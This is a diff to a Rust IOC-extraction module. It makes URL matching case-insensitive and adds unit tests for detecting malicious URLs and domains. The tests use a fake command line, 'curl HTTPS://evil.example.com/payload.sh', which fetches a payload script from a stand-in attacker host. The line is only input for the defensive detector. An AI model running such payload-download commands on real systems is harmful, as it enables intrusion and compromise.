@@ -17,7 +17,10 @@ use sha2::{Digest, Sha256};
 use std::collections::BTreeSet;
 use std::path::{Path, PathBuf};
 
-lazy_pattern!(URL_PATTERN, r#"https?://[^\s"'<>`\{\}\[\]\(\)\\]{3,512}"#);
+lazy_pattern!(
+    URL_PATTERN,
+    r#"(?i)https?://[^\s"'<>`\{\}\[\]\(\)\\]{3,512}"#
+);
 
 lazy_pattern!(
     IPV4_PATTERN,
@@ -378,6 +381,31 @@ mod tests {
         assert!(iocs.domains.contains(&"sphinx.espuny.net".to_string()));
         // example.com is noise-filtered; evil.example.com stays.
         assert!(iocs.domains.iter().any(|d| d == "evil.example.com"));
+    }
+
+    /// # Contract
+    ///
+    /// URL IOC extraction treats schemes case-insensitively while preserving
+    /// the original URL bytes returned to enrichment consumers.
+    #[test]
+    fn extracts_case_variant_url_schemes() {
+        let iocs = extract_from_text("curl HTTPS://evil.example.com/payload.sh");
+
+        assert!(iocs
+            .urls
+            .contains(&"HTTPS://evil.example.com/payload.sh".to_string()));
+        assert!(iocs.domains.contains(&"evil.example.com".to_string()));
+    }
+
+    /// # Contract (negative)
+    ///
+    /// Case-insensitive URL extraction must not widen to non-HTTP scheme
+    /// lookalikes.
+    #[test]
+    fn rejects_non_http_scheme_lookalikes() {
+        let iocs = extract_from_text("curl HTXP://evil.example.com/payload.sh");
+
+        assert!(iocs.urls.is_empty(), "unexpected URLs: {:?}", iocs.urls);
     }
 
     #[test]
